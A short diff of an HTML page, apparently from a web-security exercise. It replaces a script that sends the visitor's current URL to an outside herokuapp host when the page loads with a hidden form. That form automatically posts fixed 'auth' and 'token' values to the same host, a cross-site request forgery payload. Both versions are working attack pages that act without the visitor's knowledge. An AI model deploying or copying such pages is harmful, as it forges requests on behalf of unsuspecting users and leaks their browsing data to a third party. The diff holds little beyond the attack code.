@@ -1,19 +1,12 @@
-</!DOCTYPE html>
 <html>
-<head>
-	<title> HI </title>
+<body>
+	<form action="https://secure-chamber-88808.herokuapp.com/" method="post" id="form1">
+		<input type="hidden" name="auth" value="G2BM}L723X96j52djalZ)">
+		<input type="hidden" name="token" value="b4f46104fa1d36419e72c9d9a1ae67a749885d60dc99f9857a0a3ce2e47e52c0">
+		<input type="submit" value="submit">
+	</form>
 	<script>
-		function myFunction() {
-			var xhttp = new XMLHttpRequest();
-  			xhttp.open("GET", "https://secure-chamber-88808.herokuapp.com/" + window.location.href, true);
-  			xhttp.send();
-		  	// alert(window.location.href);
-		}
+		document.forms[0].submit();
 	</script>
-</head>
-
-<body onload="myFunction()">
-	<h1>Hello World!</h1>
 </body>
-
-</html>
+</html>	
